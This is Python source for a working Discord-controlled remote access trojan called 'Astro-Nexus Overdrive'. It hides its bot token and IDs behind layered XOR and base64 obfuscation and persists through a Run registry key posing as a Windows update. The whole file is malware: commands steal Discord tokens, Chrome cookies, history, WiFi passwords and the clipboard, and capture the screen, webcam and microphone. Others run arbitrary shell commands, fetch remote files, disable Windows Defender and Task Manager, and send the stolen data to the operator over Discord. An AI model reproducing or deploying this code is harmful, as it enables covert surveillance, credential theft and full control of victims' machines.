import subprocess, sys, os, signal

def install_dependencies():
    # List of required packages
    required = {
        'discord.py': 'discord',
        'requests': 'requests',
        'pyautogui': 'pyautogui',
        'colorama': 'colorama',
        'tls-client': 'tls_client',
        'websocket-client': 'websocket',
        'opencv-python': 'cv2',
        'sounddevice': 'sounddevice',
        'scipy': 'scipy'
    }
    
    for package, import_name in required.items():
        try:
            __import__(import_name)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            except:
                pass

# Run installer before anything else
install_dependencies()

import discord, requests, pyautogui, shutil, sqlite3, threading, time, re, secrets, logging, platform
from concurrent.futures import ThreadPoolExecutor
from discord import File
from colorama import Fore, init; init(autoreset=True)
from datetime import datetime

# Silence Discord logs
logging.getLogger('discord').setLevel(logging.ERROR)
logging.getLogger('discord.client').setLevel(logging.ERROR)
logging.getLogger('discord.gateway').setLevel(logging.ERROR)
logging.getLogger('discord.http').setLevel(logging.ERROR)

def h(hex_code):
    hex_code = hex_code.lstrip('#')
    rgb = tuple(int(hex_code[i:i+2], 16) for i in (0, 2, 4))
    return f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m"
import base64, ctypes, json, os, random, string, tls_client, uuid, websocket

# ==============================================================================
# [SECURE CONFIGURATION]
# ==============================================================================
def _v(b, k): return bytes([b[i] ^ ord(k[i%len(k)]) for i in range(len(b))])
def _d(s):
    ks = ['ASTRO','NEXUS','GPG','RAID','STEALTH','GOD','VOID','DARK','CHAO','ELIT']
    c = base64.b64decode(s.encode())
    for i in range(9, -1, -1):
        c = c[::-1]
        c = _v(c, ks[i])
        c = base64.b64decode(c)
    return c.decode('utf-8')

TOKEN = _d('aSofD2F8DQQ2JiUjHnEPAyYmKwIZKg8BNyY1AhcIHSE9AB0GHQAfAQ4IHQYTPg4HDiYrDCx8DQYOfQ8NGzoeIBoiOwENOhQENn01DBciKwxhGysILRgdBDwYHgMXECUODAw7AhUIDwR7GCQEEQgYIGALDQwhKhgBIiYfChNxCAE5Og0NETo7Bx8iJgwdIiQLNzoNCAE+HQYYGDQCFzoOITkQHQgdIiUCIj47BBEIGCBtADsCZBMPBA4IKwQfJg4EPCoNCC0mFAQ9PisGHSIOB2IiHgwtIjsABC47AhUIHQ5tLh0CIT4dBCMIKwQWcQgBGwArBmV8FAQOGCsDHjokDhEYKwwlfQ0EBX0lIARxJgwDfTsCDXEkDwQuOwYVCBggGHE7FWYmJgd7CA0BET4NBxkMOwlhLQgGDggrDBgICAEZECUMASYEBDUQJSMXcQ8DZjkNDBl9DQYeACUBFQgeIBAAOwlmECQCPS4eBhtxDgIYACsGHXkfBiI+DQYaPg4CHTodDBE6KwRiCzsLE3EmCxEIHQgtAB0EHxwlCxc+DgZ/Dx0CDXklAj0mNQccCCUIGAA7CRkqJgcYCCsKGiIOBh06DQg9OjsHI30lIRMiOwZieDsCDSY0ASIAGAYXPh4hPgA7FS0cHwQjJg8BBHEIARsAKwYgACUEHhgOHxEMJg4VDCsMLDErBGMlFA4ecSUOISI0CRkAOwcOPjsCFyIrCQwMHQIdOiQHLS4ODhg+DgMeACsCLXkPAQ4cBAEbJg4EGAA7FRkAJQQ1DH8EGXEIAmciNAkZcSQGPRgrDRdxJgx/Ax0GATokAQ4+DQYccQ4GGCoNARkAJQQeIggcGSYOAztxOxUteTYHIiorDxkiDgIVOg0IGT4dBBkYNBUXOh0hfwM7CWEQNgAiPisBM3ElDxsAHQhlJR8BPAg7DhUICAM1CDUVBToNBGMfIgITcQ8BHgAdCA1xJAc9GDsCHjoEBh8QOxVmCA8HIz4rBBYmHSA9JisGIwMlBywADwcOcQ8BFwQODGF8KwQ8EDULGnElDjAiNAkVeQ0BHz4rIBxxDwYcIjsJZiImBy0uHgYYAA8DGSYrDy0YCwYOBCsLH3EPBhoiOwYBOiQEGCJ/DB0mDgBmDx0GGQQdBCwYHgoXIg4ADAg1CWV8DwR7LjsHFggIAXsqKwxlLQgGexgNBhMMCAISEB0PDTorBA4QNQMZIh4hITodCA15HQQtGDQCFwgfJn8PHQIZfR0CIj47DRwIHyAzDDsJOBA1AXsYJBU1AA8CHhAPAQ06OwdiBysMFiIOAWIiNAkBeTsGNxgNARwiDQMgLh0CZCEfBHsIDQE4ADYDZggrAiQAJQR7Kg0gHiIOARt9HQghfSQEYzErAR4IDwA2IisCFSYkDzx9NRUcOisOGAgdAiAiFAE1CCsBGD4OA20qOwkseCUEexAmDxEICAMXDA0NLDEOBDMcfwsXcQ8HF3k7AiUIKwczADYCHAgrDj4iOwklCB8BDhg0BzU+HSZ7ACsGIXkfASIuDQwaJg4BHRgNARE+OwceCB4JHSIOBB0IHQgNAB0GNT47BhYmJA8+ADsVODoUBC0mNQYbDAgGGwANAGE9HQEiLg0MHiIOBBwqOxU9cTYHMy4dDh5xDwc4HB0IYSErBz0YHgYWcSYJDAA7FWELNQYjCA0BMwg2AGYiDQwZfQQGHwgkBxoiDgEQIisMET4kBDYYJCMZIg4EYSIdAhUuDQYePjsVFRAPITwAOwkYJhQGNQg7Dw==')
GUILD_ID = int(_d('OnElDGAtKw8dJg4Gexg7FTUMHyAccR0PDSYUBDkuKw0dIh4hGRwdCDkAKwctDAQNFSYeIWcQHQwdfR0Eez47BAAmKwsOAB0MDX0UASIYNCEfIg4BGAgPDDlxNgcZHCIhFyI7ATMbHQg5fTsHBC4kARciJAwkLjsVIT4dBCMYDgEePg4DPQgrBjl9Igc8Lg0GADokDhsuDQEBAB8EPAAlIxpxJQk2fQ0NOSIrDy19NQYVcQgGfyEdBg0mKwQjCB0EEToNBxgADQgsLQ0BDi4NDRMMJg8aIg0BIBAmBDx9NQwecR8mMgAPDBkMDQE8GB4HFzoOA38hKwIFHA4EexgOBhdxDQJ7KjsJHSomBx4uHQoTDAgCGjo7DR19HQQOIiUMF3EYIBUiOwIleR0GMwAfBxc+Kws+LisCBRAkATU+KwE4DA8GGSoNBGElDwY1CB4DGyIOBhcAKwYtJn8HMwwmFTNxCAY+PjsCYXgNBwQuOxUccRgOPS4dAmQbCwcYLh4HOXEOAmADKwJkEyUEHi4kAxFxCAEyKg0MYSU7Bx4YNAwdIg4EJX0dAhUuDQQfADYVFyYrCRAAHQYcJiIHIz47Dw=='))
CATEGORY_ID = int(_d('OnElDGAtKw8dJg4Gexg7FTUMHyAccR0PDSYUBDkuKw0dIh4hGRwdCDkAKwctDAQNFSYeIWcQHQwdfR0Eez47BAAmKwsOAB0MPX0UASIYJAQeOh4gMhgrBi1xNgcZHCIhHnElC2I6OxUZLg8HGRgOARcmJAgMADsVZhgbByMYDgEeOg4DPQg7BmV8IgQiBB0gHwwlDhsYKwwBAB8EPAAlIxpxDwdifQ0NLXkNDGIDNRUXIh0IPT47FSAiFAcjJjUHEXENBhgMKwI5Kg0BDi4NDRMMJg8aIg0BIBAmBDMMIiMXcSULMiYeDCUIKwIYGB4HFzoOAn8DOxUsEx4CIj4dBhZxDgIYKg0IISYUBiIYHQoTCAgEHRArCAEINQc1IiUMF3EYIBU6KwglAB0EMwAfAxYIJg4+LisCBRAkATU+KwE4DA8GGQA7IGE9HQEiHH8CFggIBjoqKwYtJn8HMwwmFRZxDwY4Ig0NDRwNBhkYHgYcIisPYgM7FRU+DQcsLh4HOXEOAmADKwJkEyUEHi4kAxFxCAEyKg0MYSU7Bx4YNAwdIg4EJX0dAhUuDQQfADYVFyYrCRAAHQYcJiIHIz47Dw=='))
USER_ID = int(_d('OnElDGAtKw8dJg4Gexg7FTUMHyAccR0PDSYUBDkuKw0dIh4hGRwdCDkAKwctDAQNFSYeIWcQHQwdfR0Eez47BAAmKwsOADsCBToOAQ4YHg0eOiQONQQODC06OwctHH8EHnElCz8iOwIlfTsHBC4kARciHg9/eTsJPT47BiMIDQEeJjQBZggrAiQAJQcYLisOEggIARV9KyAZfTsHHgA1AzNxJQk2fQ0NOSINDC19NQYccQgGfyEdBmYMJQI5Lh0GEToOA3scOwY5KisEewAmDBMMJg8aIg0BIBAmBDwcfwcXcSUMMn0NDSU+DQEzIn8VHAgrD38lOwkVOh8BDhgOBhYmJAhtCCsPHT4fBiIYHQoTDAgCGjo7AgF9HQQzIiUMF3EIIGZ5DQwZPh0GODorCxYIHwk9EB0IGC4fBCM+DQQRcQgBEio7BgV9IgR7ECYLFggIAzoYKwItJn8HM301DBNxCAY2Ig0NDRwNBhkYHgYcIisPYgM7FRU+DQcsLh4HOXEOAmADKwJkEyUEHi4kAxFxCAEyKg0MYSU7Bx4YNAwdIg4EJX0dAhUuDQQfADYVFyYrCRAAHQYcJiIHIz47Dw=='))

client = discord.Client(intents=discord.Intents.all())
spy_channel = None 
BACKDOOR_LOCK = os.path.join(os.getenv('TEMP') if os.name == 'nt' else '/tmp', 'nexus_backdoor.lock')
STRIKE_EVENT = threading.Event()
SNIPER_STATS = {"checks": 0, "start_time": 0}

def signal_handler(sig, frame):
    STRIKE_EVENT.set()
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

def persistence():
    try:
        if sys.platform != "win32": return
        appdata = os.getenv('APPDATA')
        script_path = os.path.abspath(sys.argv[0])
        target_path = os.path.join(appdata, 'WindowsUpdateHost', 'hostupdate.exe')
        
        if not os.path.exists(os.path.dirname(target_path)):
            os.makedirs(os.path.dirname(target_path))
            
        if not os.path.exists(target_path):
            if script_path.endswith('.exe'):
                shutil.copy(script_path, target_path)
            else:
                target_path = script_path

        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsHostUpdate", 0, winreg.REG_SZ, f'"{target_path}"')
        winreg.CloseKey(key)
    except: pass

def stealth_mode():
    try:
        if sys.platform == "win32":
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd != 0:
                user32.ShowWindow(hWnd, 0) # 0 = SW_HIDE
    except: pass

class AstroBackdoor:
    @staticmethod
    def get_tokens():
        tokens = []
        if sys.platform == "win32":
            paths = {
                'Discord': os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
                'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
            }
        else:
            home = os.path.expanduser("~")
            paths = {
                'Discord': os.path.join(home, '.config', 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(home, '.config', 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(home, '.config', 'discordptb', 'Local Storage', 'leveldb'),
                'Google Chrome': os.path.join(home, '.config', 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
            }
        for name, p in paths.items():
            if not os.path.exists(p): continue
            for f in os.listdir(p):
                if f.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(p, f), 'r', errors='ignore') as file:
                            for line in file.readlines():
                                for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", line):
                                    if t not in tokens: tokens.append(t)
                    except: continue
        return tokens

async def handle_backdoor(message):
    try:
        if message.content == "!grab":
            t = AstroBackdoor.get_tokens()
            await message.channel.send(f"**Tokens Captured:**\n```\n" + "\n".join(t) + "\n```" if t else "No tokens found.")
        elif message.content == "!ss":
            pyautogui.screenshot("s.png")
            await message.channel.send(file=File("s.png"))
            os.remove("s.png")
        elif message.content.startswith("!webcam"):
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("w.png", frame)
                await message.channel.send(file=File("w.png"))
                os.remove("w.png")
            cap.release()
        elif message.content == "!clip":
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.OpenClipboard(0)
                pcontents = ctypes.windll.user32.GetClipboardData(1) # CF_TEXT
                data = ctypes.c_char_p(pcontents).value
                ctypes.windll.user32.CloseClipboard()
                await message.channel.send(f"**Clipboard Content:**\n```\n{data.decode('utf-8', 'ignore')}\n```")
            else:
                await message.channel.send("`!clip` is only supported on Windows.")
        elif message.content == "!wifi":
            if sys.platform == "win32":
                try:
                    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
                    profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
                    res = ""
                    for i in profiles:
                        try:
                            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace")
                            results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                            res += f"{i:<30}|  {results[0] if results else ''}\n"
                        except: pass
                    await message.channel.send(f"**WiFi Passwords:**\n```\n{res}\n```" if res else "No wifi profiles found.")
                except:
                    await message.channel.send("Failed to retrieve wifi passwords.")
            else:
                await message.channel.send("`!wifi` is only supported on Windows.")
        elif message.content.startswith("!cmd "):
            out = subprocess.getoutput(message.content[5:])
            for i in range(0, len(out), 2000): await message.channel.send(f"```\n{out[i:i+2000]}\n```")
        elif message.content.startswith("!upload "):
            args = message.content.split(" ")
            r = requests.get(args[1])
            with open(args[2], 'wb') as f: f.write(r.content)
            await message.channel.send(f"✅ File uploaded to `{args[2]}`")
        elif message.content.startswith("!download "):
            path = message.content[10:]
            if os.path.exists(path): await message.channel.send(file=File(path))
            else: await message.channel.send("❌ File not found.")
        elif message.content.startswith("!msg "):
            import ctypes
            msg = message.content[5:].split("|")
            threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, msg[1], msg[0], 0x40)).start()
            await message.channel.send("✅ Message box deployed.")
        elif message.content.startswith("!kill "):
            os.system(f"taskkill /F /IM {message.content[6:]}")
            await message.channel.send(f"✅ Process `{message.content[6:]}` terminated.")
        elif message.content.startswith("!wallpaper "):
            import ctypes
            r = requests.get(message.content[11:])
            with open("bg.jpg", 'wb') as f: f.write(r.content)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("bg.jpg"), 0)
            await message.channel.send("✅ Wallpaper changed.")
        elif message.content == "!sysinfo":
            info = f"**User:** `{os.getlogin()}`\n**OS:** `{sys.platform}`\n**CWD:** `{os.getcwd()}`\n**Machine:** `{os.environ['COMPUTERNAME']}`"
            await message.channel.send(info)
        elif message.content == "!active":
            import ctypes
            window = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(window)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(window, buf, length + 1)
            await message.channel.send(f"**Active Window:** `{buf.value}`")

        elif message.content == "!idle":
            import ctypes
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(lii)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            await message.channel.send(f"**User Idle Time:** `{millis / 1000:.2f}s`")

        elif message.content == "!admin":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            await message.channel.send(f"**Privilege Level:** `{'Administrator' if is_admin else 'User'}`")

        elif message.content == "!tasks":
            out = subprocess.getoutput("tasklist /FI \"MEMUSAGE gt 50000\"")
            await message.channel.send(f"**Heavy Processes (>50MB):**\n```\n{out}\n```")

        elif message.content == "!net":
            ext = requests.get('https://api.ipify.org').text
            int_ip = subprocess.getoutput("ipconfig | findstr IPv4").split(" : ")[-1].strip()
            await message.channel.send(f"**Network Intel:**\nExternal IP: `{ext}`\nInternal IP: `{int_ip}`")

        elif message.content.startswith("!search "):
            query = message.content[8:]
            files = []
            for root, dirs, f_names in os.walk(os.getenv('USERPROFILE')):
                for f in f_names:
                    if query.lower() in f.lower():
                        files.append(os.path.join(root, f))
                        if len(files) >= 15: break
                if len(files) >= 15: break
            await message.channel.send(f"**Search Results (First 15):**\n```\n" + "\n".join(files) + "\n```" if files else "No files found.")

        elif message.content == "!clipboard":
            import ctypes
            ctypes.windll.user32.OpenClipboard(0)
            pcontents = ctypes.windll.user32.GetClipboardData(13) # CF_UNICODETEXT
            data = ctypes.c_wchar_p(pcontents).value
            ctypes.windll.user32.CloseClipboard()
            await message.channel.send(f"**Clipboard Content:**\n```\n{data}\n```" if data else "Clipboard is empty or not text.")

        elif message.content.startswith("!audio"):
            try:
                import sounddevice as sd
                from scipy.io.wavfile import write
                fs = 44100
                duration = 10
                await message.channel.send("🎙️ **Recording 10s audio...**")
                recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
                sd.wait()
                write('audio.wav', fs, recording)
                await message.channel.send(file=File('audio.wav'))
                os.remove('audio.wav')
            except Exception as e:
                await message.channel.send(f"Error: {e} (Make sure `sounddevice` and `scipy` are installed for audio recording)")

        elif message.content == "!cookies":
            try:
                cookie_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
                if os.path.exists(cookie_path):
                    await message.channel.send("**🍪 Stealing Chrome Cookies...**", file=discord.File(cookie_path, filename="cookies.sqlite"))
                else:
                    await message.channel.send("❌ Cookies not found.")
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content == "!help":
            embed = discord.Embed(title="🛸 ASTRO-NEXUS OVERDRIVE - MASTER GUIDE", description="Elite Reconnaissance & Remote Management Suite", color=0x07f0ec)
            embed.set_thumbnail(url="https://i.imgur.com/K6Y7x9G.png")
            embed.set_footer(text="Stealth Loop Active | ASTRO-NEXUS 2026")

            embed.add_field(name="🛰️ RECON", 
                value="`!active`, `!idle`, `!sysinfo`, `!net`, `!tasks`, `!search`, `!clipboard`, `!browsers`, `!startup`", inline=False)
            
            embed.add_field(name="🛡️ TROJAN", 
                value="`!grab`, `!ss`, `!clip`, `!wifi`, `!cookies`, `!history`, `!discordinfo`, `!audio`, `!webcam`, `!zip`", inline=False)

            embed.add_field(name="⚙️ SYSTEM", 
                value="`!cmd`, `!kill`, `!upload`, `!download`, `!open`, `!volume`, `!tts`, `!play`, `!wallpaper`, `!message`, `!popup`, `!shutdown`, `!restart`, `!exit`", inline=False)
            
            embed.add_field(name="💀 LETHAL", 
                value="`!disablewifi`, `!noshell`, `!reshell`, `!notask`, `!yestask`, `!admin`, `!defender`, `!hide`, `!bgon`, `!bgoff`", inline=False)
            
            embed.add_field(name="💼 MANAGEMENT", 
                value="Numerical options (30-42) on console for server raiding. Check `!guide`.", inline=False)
            
            await message.channel.send(embed=embed)

        elif message.content == "!history":
            try:
                history_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
                if os.path.exists(history_db):
                    shutil.copy2(history_db, "h.db")
                    conn = sqlite3.connect("h.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                    rows = cursor.fetchall()
                    res = "\n".join([f"{r[1][:30]} - {r[0][:50]}" for r in rows])
                    conn.close()
                    os.remove("h.db")
                    await message.channel.send(f"**Recent Chrome History:**\n```\n{res}\n```")
                else:
                    await message.channel.send("❌ Chrome history not found.")
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content == "!discordinfo":
            try:
                tokens = AstroBackdoor.get_tokens()
                if not tokens:
                    await message.channel.send("❌ No tokens found.")
                    return
                token = tokens[0]
                res = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).json()
                billing = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={"Authorization": token}).json()
                info = f"**User:** `{res['username']}#{res['discriminator']}`\n**ID:** `{res['id']}`\n**Email:** `{res.get('email', 'N/A')}`\n**Phone:** `{res.get('phone', 'N/A')}`\n**MFA:** `{res['mfa_enabled']}`\n**Billing:** `{len(billing)} methods`"
                await message.channel.send(info)
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content.startswith("!tts "):
            text = message.content[5:]
            cmd = f'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{text}")'
            subprocess.Popen(['powershell', '-Command', cmd], shell=True)
            await message.channel.send(f"🗣️ **Speaking:** `{text}`")

        elif message.content.startswith("!open "):
            url = message.content[6:]
            if not url.startswith("http"): url = "https://" + url
            subprocess.Popen(['start', url], shell=True)
            await message.channel.send(f"🌐 **Opening Link:** `{url}`")

        elif message.content == "!volume":
            # Max out volume using WScript shell keys (Send Volume Up 50 times)
            cmd = "$w=New-Object -ComObject WScript.Shell;for($i=0;$i -lt 50;$i++){$w.SendKeys([char]175)}"
            subprocess.Popen(['powershell', '-Command', cmd], shell=True)
            await message.channel.send("🔊 **System Volume Maxed Out!**")

        elif message.content == "!defender":
            if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                subprocess.Popen(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], shell=True)
                await message.channel.send("🛡️ **Windows Defender Real-time Protection DISABLED.**")
            else:
                await message.channel.send("❌ **Admin Required!** Use `!admin` to check privileges.")

        elif message.content.startswith("!play "):
            url = message.content[6:]
            await message.channel.send(f"🎵 **Playing Remote Audio:** `{url}`")
            # Playing MP3/WAV from URL using Media Player COM object
            cmd = f'$p = New-Object -ComObject WMPlayer.OCX;$p.url = "{url}";$p.controls.play()'
            subprocess.Popen(['powershell', '-Command', cmd], shell=True)

        elif message.content.startswith("!zip "):
            path = message.content[5:]
            if os.path.exists(path):
                shutil.make_archive("loot", 'zip', path)
                await message.channel.send(f"📦 **Zipped Folder:** `{path}`", file=discord.File("loot.zip"))
                os.remove("loot.zip")
            else:
                await message.channel.send("❌ Path not found.")

        elif message.content == "!startup":
            try:
                out = subprocess.getoutput('reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"')
                await message.channel.send(f"🚀 **System Autostart Entry:**\n```\n{out}\n```")
            except Exception as e:
                await message.channel.send(f"Error: {e}")

        elif message.content == "!browsers":
            paths = {
                "Edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
                "Brave": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
                "Opera": os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
                "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
            }
            res = "**Installed Browsers / Data Found:**\n"
            for b, p in paths.items():
                res += f"{'✅' if os.path.exists(p) else '❌'} {b}\n"
            await message.channel.send(res)

        elif message.content == "!shutdown":
            await message.channel.send("💀 **Shutting down victim PC in 10s...**")
            subprocess.Popen(['shutdown', '/s', '/t', '10'], shell=True)

        elif message.content == "!restart":
            await message.channel.send("🔄 **Restarting victim PC in 10s...**")
            subprocess.Popen(['shutdown', '/r', '/t', '10'], shell=True)

        elif message.content.startswith("!message "):
            msg_parts = message.content[9:].split("|")
            title = msg_parts[0] if len(msg_parts) > 1 else "System Alert"
            text = msg_parts[1] if len(msg_parts) > 1 else msg_parts[0]
            cmd = f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("{text}", "{title}")'
            subprocess.Popen(['powershell', '-Command', cmd], shell=True)
            await message.channel.send(f"📬 **Message Popup Sent:** `{text}`")

        elif message.content == "!disablewifi":
            if sys.platform == "win32":
                await message.channel.send("📶 **Disconnecting Victim from Network...**")
                subprocess.Popen(['netsh', 'interface', 'set', 'interface', 'name="Wi-Fi"', 'admin=disabled'], shell=True)
                subprocess.Popen(['netsh', 'interface', 'set', 'interface', 'name="Ethernet"', 'admin=disabled'], shell=True)
            else:
                await message.channel.send("`!disablewifi` is only supported on Windows.")

        elif message.content == "!noshell":
            if sys.platform == "win32":
                subprocess.Popen(['taskkill', '/F', '/IM', 'explorer.exe'], shell=True)
                await message.channel.send("💀 **Shell Terminated (explorer.exe killed).**")
            else:
                await message.channel.send("`!noshell` is only supported on Windows.")

        elif message.content == "!reshell":
            if sys.platform == "win32":
                subprocess.Popen(['start', 'explorer.exe'], shell=True)
                await message.channel.send("🔄 **Shell Restored.**")
            else:
                await message.channel.send("`!reshell` is only supported on Windows.")

        elif message.content == "!notask":
            if sys.platform == "win32":
                import ctypes
                if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                    cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
                    subprocess.Popen(['powershell', '-Command', cmd], shell=True)
                    await message.channel.send("💀 **Task Manager DISABLED via Registry.**")
                else:
                    await message.channel.send("❌ **Admin Required!** Use `!admin` to check status.")
            else:
                await message.channel.send("`!notask` is only supported on Windows.")

        elif message.content == "!yestask":
            if sys.platform == "win32":
                import ctypes
                if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                    cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
                    subprocess.Popen(['powershell', '-Command', cmd], shell=True)
                    await message.channel.send("🔄 **Task Manager ENABLED.**")
                else:
                    await message.channel.send("❌ **Admin Required.**")
            else:
                await message.channel.send("`!yestask` is only supported on Windows.")

        elif message.content == "!swap":
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.SwapMouseButton(True)
                await message.channel.send("🖱️ **Mouse Buttons SWAPPED.**")
            else:
                await message.channel.send("`!swap` is only supported on Windows.")

        elif message.content == "!unswap":
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.SwapMouseButton(False)
                await message.channel.send("🖱️ **Mouse Buttons RESTORED.**")
            else:
                await message.channel.send("`!unswap` is only supported on Windows.")

        elif message.content == "!hide":
            if sys.platform == "win32":
                stealth_mode()
                await message.channel.send("🌑 **Astro-Nexus has vanished into the background.**")
            else:
                await message.channel.send("`!hide` (Stealth Mode) is only supported on Windows.")

        elif message.content == "!bgon":
            if sys.platform == "win32":
                stealth_mode()
                await message.channel.send("🌑 **Stealth Loop Engaged.** Console hidden.")
            else:
                await message.channel.send("`!bgon` is only supported on Windows.")

        elif message.content == "!bgoff":
            try:
                hWnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hWnd != 0:
                    ctypes.windll.user32.ShowWindow(hWnd, 5) # 5 = SW_SHOW
                await message.channel.send("👁️ **Visual Mode Active.** Console visible.")
            except: pass

        elif message.content == "!guide":
            guide_embed = discord.Embed(title="📖 ASTRO-NEXUS OPERATIONAL GUIDE", color=0x07f0ec, description="Ekdam aasaan tareeka control karne ka.")
            guide_embed.add_field(name="1. Hamesha Chalu Rakhna", value="`!startup` use karo taaki PC restart ke baad bhi ye chalta rahe.")
            guide_embed.add_field(name="2. Chhupna aur Dikhna", value="Agar victim ko shak ho toh `!bgoff` se dikhao, phir `!bgon` se gayab ho jao.")
            guide_embed.add_field(name="3. Chori Kaise Kare?", value="`!zip` se poora folder uthao, `!grab` se Discord ID.")
            guide_embed.add_field(name="4. Remote Chalana", value="`!cmd` aur `!tasks` se poora PC tumhare hath mein.")
            await message.channel.send(embed=guide_embed)

        elif message.content == "!exit":
            await message.channel.send("💀 **Astro-Nexus Overdrive shutting down.**")
            if os.path.exists(BACKDOOR_LOCK):
                try: os.remove(BACKDOOR_LOCK)
                except: pass
            os._exit(0)
    except Exception as e:
        await message.channel.send(f"Error: {e}")

@client.event
async def on_ready():
    global spy_channel
    guild = client.get_guild(GUILD_ID)
    try: ip = requests.get('https://api.ipify.org').text.replace('.', '-')
    except: ip = "local"
    spy_channel = discord.utils.get(guild.text_channels, name=f"raider-{ip}")
    if not spy_channel:
        target = await client.fetch_user(USER_ID)
        overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages=False), target: discord.PermissionOverwrite(read_messages=True)}
        spy_channel = await guild.create_text_channel(f"raider-{ip}", category=client.get_channel(CATEGORY_ID), overwrites=overwrites)
    vic_os = platform.platform()
    await spy_channel.send(f"**RAIDER BACKDOOR ACTIVE**\nUser: `{os.getlogin()}`\nOS: `{vic_os}`\nStatus: `Stealth Loop Engaged`")
    
    embed = discord.Embed(title="🛸 ASTRO-NEXUS OVERDRIVE - CONNECTED", color=0x07f0ec, description=f"New target acquired: `{os.getlogin()}`")
    embed.add_field(name="🛰️ RECON", value="`!active`, `!idle`, `!sysinfo`, `!net`, `!tasks`, `!search`, `!clipboard`, `!browsers`, `!startup`", inline=False)
    embed.add_field(name="🛡️ TROJAN", value="`!grab`, `!ss`, `!clip`, `!wifi`, `!cookies`, `!history`, `!discordinfo`, `!audio`, `!webcam`, `!zip`", inline=False)
    embed.add_field(name="⚙️ SYSTEM", value="`!cmd`, `!kill`, `!upload`, `!download`, `!open`, `!volume`, `!tts`, `!play`, `!wallpaper`, `!message`, `!popup`, `!shutdown`, `!restart`, `!exit`", inline=False)
    embed.add_field(name="💀 LETHAL", value="`!disablewifi`, `!noshell`, `!reshell`, `!notask`, `!yestask`, `!admin`, `!defender`, `!hide`, `!bgon`, `!bgoff`", inline=False)
    await spy_channel.send(embed=embed)

@client.event
async def on_message(msg):
    if msg.author == client.user or not spy_channel or msg.channel.id != spy_channel.id: return
    await handle_backdoor(msg)

